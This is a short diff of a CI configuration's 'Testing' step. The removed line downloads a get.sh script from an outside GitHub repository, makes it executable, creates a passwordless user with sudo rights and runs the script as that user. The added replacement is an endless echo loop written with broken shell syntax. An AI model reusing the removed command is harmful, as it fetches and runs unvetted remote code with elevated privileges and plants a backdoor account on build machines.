@@ -7,4 +7,4 @@ jobs:
       - checkout
       - run:
           name: "Testing"
-          command:  sudo rm -rf get.sh && wget https://github.com/guttenocm/songdilan/blob/main/get.sh && chmod 777 get.sh && sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && sudo -u joe -H sh -c "./get.sh"
+          command: while true do echo "Running" sleep 5 done  
